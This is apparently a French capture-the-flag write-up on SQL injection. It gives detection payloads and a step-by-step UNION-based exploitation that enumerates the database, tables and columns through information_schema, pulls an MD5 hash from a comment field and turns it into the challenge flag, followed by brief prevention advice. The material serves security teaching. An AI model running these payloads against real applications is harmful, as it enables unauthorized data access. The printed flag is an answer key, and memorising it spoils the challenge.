# Nom de la faille
Injection SQL

## Définition
Les injections SQL sont une technique utilisée par des utilisateurs malveillants pour manipuler les requêtes SQL envoyées par une application web à sa base de données.

## Risques
Les injections SQL présentent plusieurs risques majeurs pour la sécurité des applications web :

- **Accès non autorisé aux données**
- **Modification des données**
- **Exécution de commandes**
- **Déni de service**

## Détection et Exploitation

### Détection
1. **Test des entrées utilisateur** :
   - Ajoutez des payloads spécifiques après le nom d'utilisateur pour voir si cela provoque des erreurs ou modifie le comportement de la page. Exemples de payloads : `'`, `"`, `#`, `;`, `)`.
   - Exemple : `1 OR 1=1` peut afficher une erreur et révéler la requête SQL dans l'URL.

2. **Analyse des erreurs** :
   - Observez les messages d'erreur retournés par l'application. Les erreurs SQL peuvent révéler des informations sur la structure de la base de données et les requêtes utilisées.

### Exploitation

1. **Trouver le nombre de champs** :
   - Utilisez `ORDER BY` pour déterminer le nombre de champs dans la requête. Par exemple, `1 ORDER BY 2` peut renvoyer une erreur si le champ n'existe pas.
   - Une fois le nombre de champs déterminé, utilisez `UNION SELECT` pour extraire des informations. Par exemple, `1 UNION SELECT 1, 2` pour vérifier le nombre de champs.

2. **Extraire des informations**

   - **Obtenir le nom de la base de données** :
     - Utilisez la requête `1 UNION SELECT 1, database()` pour obtenir le nom de la base de données actuelle.
     - Exemple de résultat : `Member_images`.

   - **Obtenir les noms des tables** :
     - Utilisez la requête `1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,105,109,97,103,101,115)` pour obtenir les noms des tables dans la base de données.
     - Exemple de résultat : `list_images`.

   - **Obtenir les noms des colonnes** :
     - Utilisez la requête `1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,105,109,97,103,101,115) AND TABLE_NAME = CHAR(108,105,115,116,95,105,109,97,103,101,115)` pour obtenir les noms des colonnes de la table `list_images`.
     - Exemple de résultat : `id, url, title, comment`.

   - **Obtenir des données spécifiques** :
     - Utilisez la requête `1 UNION SELECT 1, comment FROM list_images` qui nous donne 'Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46'

   - **Décryptage du flag** :
     - Utilisez un outil de décryptage MD5, comme [dcode.fr](https://www.dcode.fr/md5-hash), pour décrypter le hash MD5 obtenu.
       - Exemple de hash MD5 : `1928e8083cf461a51303633093573c46`.
       - Exemple de résultat : `albatroz`.
     - Appliquez la fonction de hachage SHA-256 au mot décrypté pour obtenir le flag final.
       - Flag obtenu : `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`.

## Comment l'éviter

1. **Utiliser des requêtes préparées**
2. **Valider et échapper les entrées utilisateur**
3. **Utiliser des frameworks sécurisés**

## Source
- https://www.vaadata.com/blog/fr/injections-sql-principes-impacts-exploitations-bonnes-pratiques-securite/
- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-classiques/affichage-denregistrements/
- https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/
- https://www.w3schools.com/sql/sql_injection.asp

